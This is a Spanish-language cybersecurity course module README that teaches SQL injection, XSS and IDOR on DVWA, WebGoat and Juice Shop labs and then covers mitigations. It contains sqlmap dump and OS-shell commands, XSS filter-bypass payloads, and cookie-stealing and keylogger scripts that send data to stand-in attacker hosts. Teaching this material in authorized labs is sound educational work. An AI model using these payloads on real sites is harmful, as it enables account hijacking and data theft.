---
title: 🌐 Módulo 04 — Explotación Web y Remediación (SQLi · XSS · IDOR)
description: 🌐 Módulo 04 — Explotación Web y Remediación (SQLi · XSS · IDOR)
---

# 🌐 Módulo 04 — Explotación Web y Remediación (SQLi · XSS · IDOR)

> **Objetivo principal:** Explorar y explotar de forma controlada tres vulnerabilidades web críticas (**SQL Injection, Cross-Site Scripting y IDOR**) y luego aplicar controles defensivos (hardening, headers, reglas básicas tipo WAF) y re-testear como Purple Team.

[![Nivel](https://img.shields.io/badge/Nivel-Intermedio%20%E2%86%92%20Avanzado-red?style=flat-square)]()
[![Enfoque](https://img.shields.io/badge/Enfoque-Red%20%7C%20Blue%20%7C%20Purple-purple?style=flat-square)]()
[![Vulns](https://img.shields.io/badge/Vulns-SQLi%20%7C%20XSS%20%7C%20IDOR-orange?style=flat-square)]()
[![Lab Docker](https://img.shields.io/badge/Lab-DVWA%20%7C%20WebGoat%20%7C%20Juice%20Shop-blue?style=flat-square)](./laboratorio/)
[![Portafolio](https://img.shields.io/badge/Entregables-Writeups%20%2B%20Hardening-green?style=flat-square)](./portafolio/)

---

## 📋 Resumen del módulo

| Atributo | Detalle |
|---|---|
| 🏷️ **Nivel** | Intermedio → Avanzado |
| ⏱️ **Duración estimada** | 4–8 semanas (según profundidad) |
| 🎯 **Resultado esperado** | Ser capaz de explotar SQLi, XSS e IDOR en entornos de laboratorio, diseñar mitigaciones básicas y documentar todo el ciclo Red/Blue/Purple |
| 🧪 **Práctica verificable** | Laboratorios guiados sobre DVWA, WebGoat y Juice Shop + ejercicios de hardening |
| 🗂️ **Portafolio** | Writeups de explotación (Red) y change-log de hardening (Blue/Purple) |
| 🔗 **Requiere** | [Módulo 02 — Pentesting / Red Team](../02-pentesting-red-team/) · [Módulo 03 — Análisis de Vulnerabilidades](../03-analisis-vulnerabilidades/) |
| 🔗 **Conduce a** | Módulos de explotación avanzada, AppSec y DevSecOps |

---

## 🎯 Qué aprenderás

- [ ] Identificar puntos de entrada típicos para **SQL Injection**.
- [ ] Explorar diferentes sabores de **XSS** (reflejado y almacenado).
- [ ] Entender y explotar **IDOR / Broken Access Control**.
- [ ] Conectar cada vuln con impacto en la tríada **CIA**.
- [ ] Probar mitigaciones: sanitización, parametrización, controles de acceso, headers de seguridad y reglas básicas tipo WAF/proxy.
- [ ] Escribir writeups ofensivos y registros de cambio defensivos reutilizables en tu portafolio.

---

## 🧭 Tres vulnerabilidades, tres perspectivas

| Vuln | Red Team | Blue Team | Purple Team |
|---|---|---|---|
| **SQL Injection** | Demostrar extracción o manipulación de datos | Revisar queries, parametrización, roles, logging | Diseñar y verificar re-test automático |
| **XSS** | Ejecutar payloads en el navegador víctima | Revisar sanitización, CSP, encoding, input validation | Crear casos de prueba recurrentes |
| **IDOR** | Acceder a recursos ajenos cambiando IDs | Revisar lógica de autorización y controles por recurso | Alinear reglas, logs y tests automáticos |

---

## 🗺️ Estructura del módulo

```text
04-explotacion-web/
├── README.md
├── teoria/
│   ├── 01-owasp-top10-contexto.md
│   ├── 02-flujo-explotacion-responsable.md
│   └── 03-patrones-hardening-web.md
├── explotacion/
│   ├── sqli-dvwa.md
│   ├── xss-dvwa-juice-shop.md
│   └── idor-webgoat-juice-shop.md
├── defensa/
│   ├── headers-seguridad-nginx.md
│   ├── reverse-proxy-nginx-ejemplo.conf
│   └── checklist-hardening-web.md
├── laboratorio/
│   ├── README-lab.md
│   └── docker-compose.yml
└── portafolio/
    ├── TEMPLATE-writeup-exploit.md
    └── TEMPLATE-hardening-change-log.md
```

---

## 🚀 Inicio rápido

```bash
# 1. Ir al módulo
cd 01-CIBERSEGURIDAD/04-explotacion-web/

# 2. Leer contexto
cat teoria/01-owasp-top10-contexto.md
cat teoria/02-flujo-explotacion-responsable.md

# 3. Levantar el lab
cd laboratorio/
docker compose up -d

# 4. Practicar una vuln (ejemplo SQLi DVWA)
cd ../explotacion/
cat sqli-dvwa.md
```

---

## 📈 Salida profesional del módulo

Al terminar deberías poder mostrar en tu portafolio:
- Writeups claros de al menos **1 SQLi, 1 XSS y 1 IDOR** en laboratorio.
- Un `reverse-proxy` de ejemplo con headers y ajustes de hardening documentados.
- Un change-log defensivo donde expliques cómo mitigaste lo que explotaste.

---

## ⚖️ Aviso ético

> Todo lo que practiques en este módulo debe permanecer dentro de laboratorios, entornos controlados o plataformas donde tengas autorización explícita. Nunca ejecutes payloads ni pruebas de explotación sobre sistemas de terceros sin permiso formal.

---

---

## 🛠️ Herramientas de explotación web

### SQLMap — SQL Injection automatizado

```bash
# Detectar SQLi automáticamente
sqlmap -u "http://target.com/page?id=1"

# Nivel de testing
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Enumerar bases de datos
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerar tablas
sqlmap -u "http://target.com/page?id=1" -D database --tables

# Dump completo de una tabla
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Obtener shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# POST requests
sqlmap -u "http://target.com/login" --data="user=admin&pass=*" --batch

# Con cookies (para bypass de autenticación)
sqlmap -u "http://target.com/admin?id=1" --cookie="session=abc123" --level=2
```

### Burp Suite — Suite completa de testing web

```bash
# Configurar proxy
# Browser → Proxy → 127.0.0.1:8080

# Intercept
# 1. Activar Intercept
# 2. Navegar a la app
# 3. Modificar requests en vivo
# 4. Enviar a Repeater para testing manual

# Intruder — Fuzzing
# 1. Seleccionar request → Send to Intruder
# 2. Definir positions ($param$)
# 3. Seleccionar payload type
# 4. Agregar payloads (SQLi, XSS, etc.)
# 5. Start attack
# 6. Analizar respuestas (tamaño, status code)

# Comparador de respuestas
# 1. En Repeater, enviar request normal
# 2. Copiar response
# 3. Modificar payload
# 4. Comparar respuestas
```

### XSS payloads

```javascript
// Reflejado básico
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Bypass de filtros
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert&#40;'XSS'&#41;>

// XSS almacenado en textarea
<textarea onfocus=alert('XSS') autofocus>

// XSS en atributos
" onfocus="alert('XSS')" autofocus="
' onfocus='alert('XSS')' autofocus='

// Cookie stealing
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src="http://attacker.com/log?k="+e.key}</script>
```

### IDOR — Manipulación de IDs

```bash
# Cambiar IDs en URLs
GET /api/user/123  → GET /api/user/124
GET /api/order/456 → GET /api/order/457

# Cambiar IDs en POST
POST /api/transfer
{"from": "1001", "to": "1002", "amount": 100}
→ Cambiar "from" a "1003"

# Secuencial → Predecible
GET /api/invoice/1001
GET /api/invoice/1002  ← El siguiente es predecible

# UUID vs Sequential
# UUID: 550e8400-e29b-41d4-a716-446655440000
# Sequential: 1, 2, 3, 4... (fácil de adivinar)
```

---

## 🧪 Ejercicios prácticos

### Ejercicio 1: SQL Injection manual

```bash
# 1. Iniciar DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# 2. Navegar a http://localhost/DVWA/vulnerabilities/sqli/

# 3. Probar inyección básica
Input: 1'
Input: 1 OR '1'='1
Input: 1' OR '1'='1' --
Input: 1' UNION SELECT null,null --
Input: 1' UNION SELECT null,table_name FROM information_schema.tables --
Input: 1' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users' --
Input: 1' UNION SELECT null,concat(user,0x3a,password) FROM users --

# 4. Documentar cada paso y resultado
```

### Ejercicio 2: XSS reflejado y almacenado

```bash
# 1. Iniciar DVWA
# 2. Ir a XSS Reflected

# Reflejado:
Input: <script>alert('XSS')</script>
Input: <img src=x onerror=alert('XSS')>
Input: "><script>alert('XSS')</script>

# 3. Ir a XSS Stored
Input: <script>alert('XSS')</script>
# El payload se ejecuta cuando otros usuarios visitan la página

# 4. Cookie stealing (en lab controlado)
<script>new Image().src="http://attacker:8888/steal?c="+document.cookie</script>
```

### Ejercicio 3: IDOR — Acceso no autorizado

```bash
# 1. Login con usuario test/test123
# 2. Navegar a tu perfil: /api/user/1001
# 3. Cambiar ID: /api/user/1002
# 4. Si ves datos de otro usuario → IDOR confirmado

# Bypass de controles:
# - Cambiar method GET → POST
# - Agregar header X-Forwarded-For
# - Cambiar Content-Type
# - Usar JSON en vez de form-data
```

### Ejercicio 4: Explotación completa

```bash
# 1. Levantar lab vulnerable
docker compose up -d

# 2. Reconocimiento
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

# 3. SQLi en login
sqlmap -u "http://target/login" --data="user=admin&pass=*" --dump

# 4. XSS en parámetro de búsqueda
<script>fetch('http://attacker/steal?c='+document.cookie)</script>

# 5. IDOR en API
for i in $(seq 1 100); do
  curl -s http://target/api/user/$i | jq '.name'
done

# 6. Documentar todo en writeup
```

---

## 🔒 Mitigaciones (Blue Team)

### SQL Injection
```python
# MAL - Concatenación
cursor.execute("SELECT * FROM users WHERE id = '" + user_id + "'")

# BIEN - Parametrización
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### XSS
```html
<!-- MAL -->
<div>{{ user_input }}</div>

<!-- BIEN -->
<div>{{ user_input | escape }}</div>

<!-- CSP Header -->
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### IDOR
```python
# MAL - ID directo del usuario
@app.route('/api/user/<int:id>')
def get_user(id):
    return db.get_user(id)

# BIEN - ID del usuario autenticado
@app.route('/api/user/me')
def get_my_user():
    return db.get_user(current_user.id)
```

---

## 📋 Checklist de explotación web

- [ ] SQL Injection identificada y explotada
- [ ] XSS reflejado/almacenado demostrado
- [ ] IDOR explotado con acceso a datos ajenos
- [ ] Impacto CIA documentado para cada vuln
- [ ] Mitigaciones implementadas y verificadas
- [ ] Writeup completo con evidencia

---

**[⬆ Volver al índice](../../README.md)** · **[📖 Teoría](./teoria/01-owasp-top10-contexto.md)** · **[🧪 Lab](./laboratorio/README-lab.md)**
